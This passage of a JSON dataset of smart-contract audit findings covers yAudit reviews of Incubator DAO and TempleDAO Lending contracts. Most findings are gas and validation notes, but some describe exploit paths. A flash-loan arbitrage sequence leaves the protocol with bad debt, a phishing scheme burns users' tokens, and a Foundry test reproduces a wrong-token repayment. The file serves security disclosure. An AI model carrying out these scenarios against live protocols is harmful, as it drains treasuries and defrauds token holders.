        "body": "Incubator DAO will use the incubdao.eth snapshot.org space for governance voting. Because the governance approach will follow the approach used by ROOK, the same erc20-balance-of snapshot.org voting strategy will be used. This means that there is no need for the pROOK token to include voting logic on-chain, because the token balance held by an address will determine the votes that address receives.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "4. Limit pROOK burn functions",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Incubator-DAO.md",
        "body": "If a user burns their pROOK token, they will lose the chance to redeem their pROOK for USDC during Phase 2 of the Incubator DAO rage quit process. Because ERC20Burnable.sol includes a public burnFrom() function, which only requires an allowance to be given to burn pROOK tokens, it's possible that scam websites could attempt to phish users to sign a pROOK allowance and burn their tokens during Phase 1 so that pROOK holders in Phase 2 would be allocated more USDC. This is because the exchangeRate in Phase 2 will be set to remaining_USDC / pRook.totalSupply(), and burning pROOK would reduce the totalSupply value.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "5. Remove SafeMath import",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Incubator-DAO.md",
        "body": "Solidity 0.8.0 introduced a breaking change to implement overflow and underflow protection. This means the SafeMath imports can be removed to save gas on deployment: exchangeROOK.sol import exchangepROOK.sol import",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "6. Declare variables immutable when possible",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Incubator-DAO.md",
        "body": "The token variables in exchangeROOK.sol and exchangepROOK.sol can be immutable. They are only set in the constructor and are not changed after that. exchangeROOK.sol token variables exchangepROOK.sol token variables",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "7. Remove ERC20.sol import from exchange contracts",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Incubator-DAO.md",
        "body": "The ERC20.sol import in the exchange contracts is not needed and will spend unnecessary gas on deployment, so it can be removed. exchangeROOK.sol ERC20 import exchangepROOK.sol ERC20 import",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "8. Use consistent solidity versions",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Incubator-DAO.md",
        "body": "exchangeROOK.sol and exchangepROOK.sol use solidity 0.8.12, but prook.sol uses solidity ^0.8.9. Because different versions of solidity contain minor differences, and because the newer versions of solidity contain bug fixes and gas optimizations, it is generally recommended to use one of the most recent solidity versions.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "9. Add event to setExchangeRate()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Incubator-DAO.md",
        "body": "Consider adding a ExchangeRateSet event in: exchangeRook.setExchangeRate() exchangepRook.setExchangeRate()",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "10. Make public functions external",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Incubator-DAO.md",
        "body": "Declare these public functions as external because they do not need to be called internally: mint() in prook.sol pause() in exchangeROOK.sol and in exchangepROOK.sol unpause() in exchangepROOK.sol and in exchangepROOK.sol",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "11. Incorrect values in governance proposal",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Incubator-DAO.md",
        "body": "The governance proposal states that the exchangeROOK.sol exchangeRate will be set by the following equation: an exchange rate defined by Incubator DAO total treasury  (ROOK total supply [1,268,253.79] - DAO owned ROOK [162,807.40] - Strategic Reserve owned ROOK [452,137.53] - DAO contributors owned ROOK [35,175.14]) The first number in this equation is inaccurate and is off by about 5 ROOK. The current on-chain totalSupply value of ROOK token is 1268248.759, which is visible with etherscan or with: cast --from-wei $(cast call 0xfa5047c9c78b8877af97bdcb85db743fd7313d4a \"totalSupply()(uint256)\") The second number in this equation is also inaccurate. Based on the top ROOK holders etherscan chart, the 2nd largest ROOK holder, which we will assume is the DAO owned ROOK tokens, holds 162,780 ROOK. This is a difference of roughly 27 ROOK from the value in the governance proposal. The governance proposal does use the correct value for the Strategic Reserve owner ROOK of 452,137.53. The DAO contributors owned ROOK value is not easily checked at the time of the audit because the tokens are held by different addresses but will be combined into a multisig.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "1. Debtor debt can be cleared if rate is set to zero",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "Debtor interests are calculated using the function _compoundedDebtorInterest(). The implementation of this function will return zero if the rate is set to zero: function _compoundedDebtorInterest(Debtor storage debtor) internal view returns (uint256) { uint256 _rate = debtor.rate; if (_rate == 0) return 0; .... If the interest rate is first set to a positive number and then later set to zero, then the accrued debt of the debtor will be nullified as it will be reset to zero. As we can see in the following snippet of code, the return value of _compoundedDebtorInterest() will be stored in debtor.checkpoint, which represents the current accrued debt. function _checkpointDebtor(Debtor storage debtor) internal returns (uint256) { uint256 interest = _compoundedDebtorInterest(debtor); unchecked { estimatedTotalRiskPremiumInterest += (interest - debtor.checkpoint); } debtor.checkpoint = uint160(interest); debtor.checkpointTime = uint32(block.timestamp); return interest; } Note also that balanceOf() and currentDebtOf() will be affected as these use _compoundedDebtorInterest() internally.",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "2. TPI can still be updated while there is a pending change",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "The TreasuryPriceIndexOracle.sol uses a cooldown mechanism for price updates. Whenever the price is updated using setTreasuryPriceIndex(), the contract will store the overwritten value and will continue to return this price as long as the cooldown duration is in effect. However, there's nothing preventing this function from being called again during the cooldown period. Doing so will nullify the cooldown for the current change: the currentTpi value (which should be active after the cooldown) will become the previousTpi and treasuryPriceIndex() will return this value before the original cooldown expires. After discussions with the devs, it was determined that the cooldown is intended to allow for the TPI to be changed again during the cooldown period if the first TPI value was set incorrectly. The logic flow in this case where setTreasuryPriceIndex() is called a 2nd time during the cooldown period to fix an error causes an even larger problem. The problem is that during the cooldown period, the previous TPI value is considered the correct TPI value. If an incorrect TPI value is set, it will be stored in the currentTpi variable, but when it gets replaces with a second setTreasuryPriceIndex() call, the value previously stored in currentTpi will be stored as previousTpi. This means the incorrect TPI value will immediately become the real TPI value used by the protocol during the process of attempting to replace and fix the original mistake. The result is that the cooldown and the surrounding logic potentially make the situation worse than if the contract didn't implement the cooldown, because in the current flow, an attempt to fix a mistake by updating the TPI causes the mistaken TPI value to immediately be used in production. Note also that it is possible to adjust the cooldown duration while there is a current pending change too. This is another way that the TPI can be changed faster than the existing cooldown.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "3. Updating the debt ceiling for the line of credit strategy should trigger an update to the interest rate",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "The calculation of the interest rate in the line of credit contract depends on the interest rate model and the utilization ratio, which is the debt over the available amount of tokens, defined as the debt ceiling of the strategy. If any of these values changes, the interest rate should be updated. While the rate is updated when the strategy changes, there is nothing ensuring that the interest rate is recalculated if the debt ceiling for the line of credit strategy gets updated in the TreasuryReservesVault.sol contract.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "4. Possibility of TLC bad debt from TPI increase",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "The TPI is a value that is set by TempleDAO governance. This value is updated in a single block. For example, the latest TPI increase can be seen with: cast call 0xC3133cB9e685ccc82C73FbE580eCeDC667B41917 \"templePriceFloorNumerator()(uint256)\" --block 17737310 Return Value: 10250 cast call 0xC3133cB9e685ccc82C73FbE580eCeDC667B41917 \"templePriceFloorNumerator()(uint256)\" --block 17737311 Return Value: 10600 The TPI value is assumed to be equal to the price of TEMPLE when the value of TEMPLE collateral is calculated in TempleLineOfCredit.sol. This is in contrast to lending protocols such as Compound Finance, which use the current price of a token from Chainlink to determine the value of user collateral. It is possible, in fact likely, that the TPI value is greater than the value of TEMPLE based on the spot price of the Balancer pool. The graph illustrating the variation of the two prices is found on TempleDAO's homepage. If the difference between the spot price in the Balancer pool and the TLC is too great, an arbitrageur can leave the protocol with bad debt. Consider a scenario where TPI was at $1, the spot price of TEMPLE is $0.90, and the TPI was just raised by governance to $1.15: User takes DAI flashloan from Balancer with a 0% cost. User swaps DAI for TEMPLE in TEMPLE-DAI balancer pool. The volume of the swap can raise the TEMPLE price in the pool to $0.95 User deposits the newly acquired TEMPLE into the TLC and maxes out their LTC with a 85% LTV loan. The user will get liquidated almost immediately because the interest accumulated in the next block will cause them to exceed the max LTC threshold of 85%. But the user doesn't care, because $1 worth of DAI got them 1/0.95 = 1.053 TEMPLE. This TEMPLE is valued at 1.053*1.15 = $1.211 and can have 85% of its value borrowed, which is 1.211*0.85 = 1.029 In this example scenario, the arbitrageur walks away with a 2.9% profit. The bad debt will lower the holdings of the TempleDAO treasury and reduce the TPI, impacting TEMPLE token price. Another version of this bad debt scenario can happen in reverse if the TPI is decreased significantly while the TEMPLE spot price is significantly below TPI: User takes TEMPLE flashloan from Balancer with a 0% cost. User deposits TEMPLE into TLC, takes out DAI loan with max LTV when TPI is high relative to current TEMPLE token price. User swaps DAI to TEMPLE in Balancer pool when TEMPLE price is below TPI. User repays flashloan, retaining any profit. The profit comes at the expense of the TempleDAO treasury. There are already some protective measures preventing this scenario, but because these protective measures are controlled by governance, it's possible that future protocol changes may limit the effectiveness of these protective measures. The protective measures include: RAMOS should rebalance the price of TEMPLE in the Balancer pool if the price of TEMPLE drops below 1% of the TPI (note: the script linked to was not in the commit hash that the audit focused on). The maxTreasuryPriceIndexDelta value limits how large of a change the TPI can experience thanks to a check in setTreasuryPriceIndex(). The current choice of setting maxTreasuryPriceIndexDelta to 0.05 combined with the current choice of setting the max LTV to 0.85 should protect the protocol. However, be aware these values can be changed by governance, and there is no cooldown on setTreasuryPriceIndex(), meaning there is no real limit to how much governance can increase TPI in a single block. The first protective measure mentioned, the RAMOS rebalancing, is run by a bot controlled by governance. This bot is running off-chain and has the potential for more downtime that the Ethereum blockchain. Therefore, when consider extreme edge cases, the most extreme case is a scenario where the RAMOS bot is offline and is temporarily unable to stabilize the price of TEMPLE in the Balancer pool.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "5. checkNSignatures() logic causes revert",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "SafeForked.checkNSignatures() has an extra line require(keccak256(data) == dataHash, \"GS027\"); that is not found in v1.3.0. This line is found in the latest v1.4.1 release of the Gnosis Safe code. But the values of dataHash and data in the gnosis code are set differently than in the TempleDAO code. When checkNSignatures() is called from ThresholdSafeGuard.checkTransaction() with the line SafeForked.checkNSignatures(safeTxExecutor, safe, keccak256(txHashData), data, signatures, threshold);, the expectation is that data == txHashData to pass the later require statement. But data != txHashData because txHashData consists of encoded values that includes data. If this require() check fails, all calls to ThresholdSafeGuard.checkTransaction() that include at least one contract signature (when v == 0) will fail, reverting the transactions passing through the Gnosis guard. After discussions with the development team, the bug exists in the if/else branch where v == 0. This logical branch is not expected to be reached because the new governance multisig that will be using the Gnosis Safe Guard will only have EOA signers and no smart contract signers. This means the problematic line of code should not be reached by TempleDAO logic.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "6. Can repay debt for wrong borrow token",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "repay() and repayAll() accept a token and strategy function argument. There are two valid token values, the DAI address or the TEMPLE address. This is confirmed by the existing strategies and the deployment scripts for dUSD and dTEMPLE as the only debt tokens. There is no verification that the token and strategy arguments match, meaning that the token address can be a borrow token that does not match with the borrow token used by the strategy. The only strategy that handles more than one token (DAI and TEMPLE) is the Ramos strategy, so the other strategies should be limited to accumulating only debt in the token that they handle. It is unclear how the debt token and credit balances are queried off-chain to handle accounting of the overall system (this accounting is not performed on-chain with an equivalent of yearn vault's report()), but this scenario may cause accounting issues if the debt and credit balances are handled improperly. The caller of repay() does donate tokens to the protocol, so there is a cost to this call flow. A foundry test demonstrating this issue, based on the existing test_repay_withDTokenDebts_noCreditLeft test: function test_repay_withDTokenDebts_wrongToken() public { // Setup the config { vm.startPrank(executor); trv.setBorrowToken(dai, address(0), 0, 0, address(dUSD)); trv.setBorrowToken(temple, address(0), 0, 0, address(dTEMPLE)); deal(address(dai), address(trv), 120e18, true); deal(address(temple), address(trv), 120e18, true); ITempleStrategy.AssetBalance[] memory debtCeiling = new ITempleStrategy.AssetBalance[](1); debtCeiling[0] = ITempleStrategy.AssetBalance(address(dai), 50e18); trv.addStrategy(address(strategy), -123, debtCeiling); } // Borrow some so there's a debt { changePrank(address(strategy)); trv.borrow(dai, 5e18, address(strategy)); } // Fund alice so she can repay on behalf of the strategy { deal(address(temple), alice, 50e18, true); changePrank(address(alice)); temple.approve(address(trv), 50e18); } { trv.repay(temple, 7e18, address(strategy)); } // TEMPLE transferred to TRV, dToken DAI credit given to strategy as it started with no debt assertEq(dai.balanceOf(address(strategy)), 5e18); assertEq(dai.balanceOf(address(trv)), 120e18 - 5e18); assertEq(temple.balanceOf(address(alice)), 50e18-7e18); assertEq(trv.strategyTokenCredits(address(strategy), dai), 0); assertEq(trv.strategyTokenCredits(address(strategy), temple), 7e18); assertEq(dUSD.balanceOf(address(strategy)), 5e18); assertEq(dTEMPLE.balanceOf(address(strategy)), 0); }",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "7. Potential clashing between function calls and ETH payments in ThresholdSafeGuard.sol",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "Threshold configurations for functions are stored in a mapping whose keys are the contract address and the function selector. The check then queries this mapping to fetch the associated threshold setting. ETH transfer transactions are represented by a function selector of zero, as indicated by this comment: @dev functionSignature=bytes(0) is ok as this represents an ETH transfer which may also have an explicit threshold. As zero function selectors are valid (see issue Function selectors with a zero value are valid), this unveils a potential clashing between a function whose selector is zero and an ETH transfer. The checkTransaction() function casts the calldata parameter to bytes4 without checking the size: ... threshold = getThreshold(to, bytes4(data)); ... If the data argument is empty, then bytes4(data) will be zero, creating a conflict with a potential call to a function with a zero selector.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "8. currentUtilisation() can return stale data",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "The logic of _currentUtilisation() is to loop through the buckets and sums the amounts. But this naive approach omits the possibility that the buckets contain old data that will be cleared on the next preCheck() and therefore the values stored in some buckets may not be relevant to checking the proximity to the current cap. These stale buckets should be ignored, the same way those stale buckets are cleared in preCheck(). This is only an issue when _currentUtilisation() is called from currentUtilisation(), because when called from preCheck() the buckets are updated before the call to _currentUtilisation().",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "9. setConfig() resets buckets and gives minor circuit breaker bypass",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "setConfig() lets governance choose new values for period duration, buckets, and cap. In this process, it resets the amount value of every bucket. While the bucket values are all reset to zero (or 1, though this dust is subtracted out later), this gives a window of opportunity to maximize the value passing through the circuit breaker. The worst case scenario with one setConfig() call is twice the circuit breaker cap value, and this can be generalized to n+1 times the circuit breaker cap for n number of setConfig() calls in a short timespan. So if a user frontruns a single setConfig() call to reach the cap before the config is changed, then setConfig() will reset all the buckets and the user can reach the cap again (second time) in a very short timespan, potentially in a single block.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "10. Weak liquidation incentives can result in unliquidated bad debt",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "The liquidation of an undercollateralized position in TLC is performed by batchLiquidate(). The function checks if an address has an undercollateralized loan, and if so, the TEMPLE collateral is burned. No DAI is moved because the lender did not return the loaned funds, so only the collateral is in the protocol's possession. The burning of user-owned TEMPLE means that there is more treasury value per user-owned TEMPLE, increasing the protocol TPI. An increase in TPI indicates an increase in TEMPLE token price. This means that even though there is no liquidation incentive like there is in a protocol such as Compound Finance, TEMPLE holders should be incentivized to perform liquidations because it increases the value of the token they hold. The problem with this assumption is that it may fail in conditions with high gas prices or where all token holders hold only small amounts of the token, leading to a bad debt situation that sits unresolved and grows worse due to accumulating interest. Assume turbulent market conditions exist and cause mainnet gas prices to increase to $100 for a liquidation transaction. Further, assume that some loans might be eligible for liquidation due to interest accumulation, possibly from the same market turbulence. If a user owns 1% of all circulating TEMPLE, then to make the $100 transaction profitable to execute, the liquidation would have to result in a $10,000 profit to the protocol. If the $10,000 profit represents the 15% overcollateralization of the loan, then the total loan size is $66,666, which is a very large loan. Given this example, it may be no surprise that the protocol is designed in a way that the bot maintained by governance is expected to be the main liquidator for the protocol. This is because there is no incentive given to the liquidator except an increase in TPI (as long as the liquidation is profitable), and because the protocol multisig is the largest token holder at the current time, governance has the most incentive to liquidate positions and increase TPI. But in the case that governance is the primary liquidator, there is the risk that if governance liquidates positions when gas costs exceed liquidation profits, this impacts token value for all TEMPLE holders by lowering TPI because gas costs are paid by the same treasury that represents the value held by the TEMPLE token. There is the addition risk that if the bot goes offline, no one will have incentive to liquidate positions, but given the borrowing interest rate curve and active role of governance in this protocol, that is a much lesser risk. This example shows that there is limited incentive for most TEMPLE token holders to liquidate undercollateralized positions. If the undercollateralized loan sits unresolved, the TEMPLE that serves as collateral to that loan is effectively weighing down the TPI. Even though it is not profitable for any user to liquidate the undercollateralized position, especially smaller loans, there will be no increase in TPI until gas prices drop enough to make the liquidation profitable (a quicker solution) or the loan accumulates enough interests to counteract the high gas prices (a slower solution). The current design of TempleDAO is to use a governance-run bot to perform the liquidations, but this bot can encounter the same situation of unprofitable liquidations. If there are small value loans that are undercollateralized, the bot should not liquidate the loans when there are very high gas costs, because the protocol will lose value. It is also possible that the governance-run bot goes offline due to an outage in Google Cloud, AWS, or whichever server provider(s) are used, so the on-chain bot cannot be relied on to have 100% uptime on par with a stable blockchain.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "11. Function selectors with a zero value are valid",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "Function selectors are represented by the first four bytes of the hash of the function signature. As these are the result of a hash function, it is possible and valid to have a function selector with the zero value (i.e. the first four bytes are zero). There are two occurrences in the codebase in which function selectors taken as input arguments are validated to be different from zero: setExplicitAccess() in TempleElevatedAccess.sol setFunctionThresholdBatch() in ThresholdSafeGuard.sol",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "12. Aura rewards may be locked in AuraStaking",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "The getReward() function is intended to collect the reward tokens received from staking in Aura and send those tokens to rewardsRecipient. But the rewardTokens array is only set in the constructor and cannot be modified after. The Aura contract has a addExtraReward() function that can add to the existing list of reward tokens, but AuraStaking.sol is not designed for such flexibility. If AuraStaking.sol does not contain the full list of reward tokens, then the missing tokens will be sent from Aura to AuraStaking.sol and stay trapped in the TempleDAO contract.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "13. Borrowers may be instantly liquidated after rescue mode is disabled",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "After rescue mode is enabled, all major functions of the contract are paused (notInRescueMode modifier). This means that repayments cannot be done by borrowers (since repay() and repayAll() are blocked), but their debt is still accrued. If a position becomes unhealthy while the rescue mode is enabled, a borrower can be liquidated as soon as the pause is disabled, and before they can even attempt to normalize their situation.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "14. Token allowance isn't revoked when updating TRV in Gnosis strategy",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "When repayments to the treasury vault are made from the Gnosis strategy, both repay() and repayAll() will execute an infinite (i.e. type(uint256).max) token approval so that the vault can pull the tokens from the strategy contract. The treasury vault contract can be updated in strategies, however, the implementation of _updateTrvApprovals() is empty for the GnosisStrategy.sol contract. This means that previously configured vaults will still have unrestricted access to tokens held by the strategy contract.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "15. Validate rate parameters in LinearWithKinkInterestRateModel.sol",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "When the utilization ratio is above the kink, the slope of the linear model is defined as (maxInterestRate - kinkInterestRate) / kinkUtilizationRatio. This means that maxInterestRate >= kinkInterestRate. Similarly, in the other case, the slope is defined as (kinkInterestRate - baseInterestRate) / kinkUtilizationRatio, which implies that kinkInterestRate >= baseInterestRate.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "16. Account validation in TempleElevatedAccess.sol",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "The constructor of TempleElevatedAccess.sol initializes initialRescuer and initialExecutor without checking for zero/empty addresses. Additionally, as the rescuer account is intended to be a support role of the executor account, it is important to validate that both accounts are not the same address. The design intent is for rescuer and executor to be multisigs and not EOA, so an extra check can be added to verify these addresses are contracts.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "17. Zero token transfers while claiming rewards in AuraStaking.sol",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "Some ERC20 implementations revert on zero value transfers. The implementation of the getReward() function in the AuraStaking.sol contract executes a token transfer of the contract's token balance without actually checking if the balance is not zero. Since all reward tokens are pulled and transferred simultaneously, a failure in any of the token transfers would result in a transaction revert, causing a denial of service in the reward claiming process.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "18. Insufficient gas for max buckets in TempleCircuitBreakerAllUsersPerPeriod.sol",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "TempleCircuitBreakerAllUsersPerPeriod.sol comments and the declaration of buckets indicate that the design is intended to allow up to 65535 buckets. But it is not easy to create anywhere near this number of buckets directly, because setConfig() reverts due to lack of gas if less than 10% that many buckets are supplied in the constructor. This is because _setConfig() clear the bucket values by looping through all buckets to set their initial value to 1. Now because of how solidity memory works, it may be possible for governance to clear 4000 buckets of array space at a time without running out of gas. But then in order to reach 65k buckets, setConfig() would need to be called over 10 times, incrementally increasing the value of nBuckets each time. Overall, the current design means that realistically the maximum number of buckets is too large, and the buckets array is oversized for an ETH mainnet deployment with a 30 million gas limit.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "19. addStrategy() allows setting debt ceiling for tokens without borrowing enabled",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "setStrategyDebtCeiling() checks if a token is a borrowable token before setting the debt ceiling of that token with the line if (!_borrowTokenSet.contains(address(token))) revert BorrowTokenNotEnabled();. When the debt ceiling is set in addStrategy(), there is no such check to confirm that the token is a borrowable token. This means the two functions have different checks even though they have the same onlyElevatedAccess modifier controlling who can call these functions.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "20. shutdown() doesn't delete strategyTokenCredits values",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "The goal of shutdown() in TreasuryReservesVault.sol is to remove all data related to a strategy from variables and mappings. Although the credit value stored in the strategyTokenCredits mapping is used in the StrategyShutdownCreditAndDebt event, the value is never deleted.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "21. Casting overflow risk in strategy borrowing",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "_availableForStrategyToBorrow() calculates how many more tokens a strategy is allowed to borrow. To prevent a revert due to underflow, the function casts uint256 values to int256 values. Casting has no overflow protection, and because the debtCeiling value can be set to any arbitrary integer, it is possible that a very high ceiling value would result in an overflow. An overflow of the sum _ceiling + _credit would not give a strategy more borrowing than it should, but an overflow of dTokenBalance could cause int256(dTokenBalance) to resolve to a negative value, increasing the strategies borrowing greater than it should be. dTokens are minted 1:1 for the amount of tokens borrowed, so it is unlikely to reach a value that is large enough to overflow the int256 data type, but a modified implementation for this function could remove the problem entirely.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "22. Ramos inconsistencies between constructor and setter functions",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "setPostRebalanceSlippage() reverts when trying to set postRebalanceSlippage as zero. Because postRebalanceSlippage is zero by default, and it is not set in the constructor, it will remain zero until setPostRebalanceSlippage() is called. The same issue of a default zero value until otherwise set applies to setMaxRebalanceAmounts(), setRebalancePercentageBounds(), setTpiOracle(), setTokenVault(), and setRebalanceFees(). feeCollector() does not have this issue because feeCollector is set in the constructor. The constructor does not check if any state variables are set to valid values, but the setter functions do introduce this check. This means that the value set in the constructor may not align with the assumptions made elsewhere in the contract. For example, feeCollector cannot be set to the zero address value in setFeeCollector(), but can be set to the zero address value in the constructor. The maxRebalanceFee value implicitly should be less than BPS_PRECISION due to the accounting logic in the contract, but there is no logic in the constructor to confirm that maxRebalanceFee < BPS_PRECISION.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "23. Hardcoded Maker DSR base rate doesn't match on-chain value",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "There are two issues related to how TempleDAO handles the MarkerDAO DSR rate: The first issue is easy to fix. The deployment script uses the old MakerDAO DSR value of 3.49%, but the new value is 3.19%. This is confirmed by makerburn.com and by querying the on-chain value: cast call 0x197E90f9FAD81970bA7976f33CbD77088E5D7cf7 \"dsr()(uint256)\" --block 17722371 Return value: 1000000001087798189708544327 (equates to 3.49%) cast call 0x197E90f9FAD81970bA7976f33CbD77088E5D7cf7 \"dsr()(uint256)\" --block 17722372 Return value: 1000000000995743377573746041 (equates to 3.19%) The second and third issues suggest that a redesign may be a better approach to properly handle integration with MakerDAO's DSR. Instead of storing a baseRate value and calculating the accumulated interest, these operations should be outsourced to MakerDAO's contracts to avoid conflicting accounting calculations. If mismatched accounting is allowed to operate over long timespans, the delta between the actual value accrued from MakerDAO's DSR and the estimated interest accumulated calculated by TempleDAO can grow. If the value is overestimated, this can lead to bad debt and users can be misinformed about the interest rate they expect they are getting with the MakerDAO DSR integration. Although the ideal case would be for the base rate to match the Maker DSR rate, the developer intent is to allow the base rate to change in the future to be based on a different protocol. The contract therefore cannot be designed only around MakerDAO. Additionally, governance has options to adjust the accumulated interest (by minting/burning debt tokens or temporarily overcorrecting the base rate for a short period) if precision of the internal credit and debt becomes important later. For now, the internal credit and debt is only useful for governance to compare the performance of strategies against one another, and because the comparison is relative, precise values matching the MakerDAO DSR rate will not impact the comparison process.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "24. Simplify logic in removeLiquidity() function",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "In the implementation of removeLiquidity(), tokens are repaid to the strategy by iterating the array of assets and checking if each asset corresponds to the quote or protocol token. This is not really needed and can be simplified by removing the loop and just repaying both tokens.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "25. Avoid burn logic if amount is zero",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "The amount of tokens to burn is limited by the actual debt amount of the debtor. This means that, even if the original argument (_burnAmount) is greater than zero, it can be overridden to zero if the debtor doesn't have any debt. If this is the case, the implementation will still call the internal function _burn(), wasting gas in operations that won't alter the state. This is particularly relevant, in the context of the vault, for strategies that execute repayments without having any actual debt. Repayment logic calls the burn() function of the debt token to know how much excess should be accounted for as credit.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "26. Duplicate and unneeded logic in repayAll()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/07-2023-TempleDAO-Lending.md",
        "body": "Shared logic present in the _repayToken() contains code which is not really needed for the case of repayAll(). Account debt is recalculated (calls to _currentAccountDebt()). The check to validate that the amount does not exceed the debt is not needed (since _repayAmount equals _newDebt). debtCheckpoint can be set directly to zero, as it is paying the full debt.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "27. Move debt token cache out of the loop in computeLiquidity()",
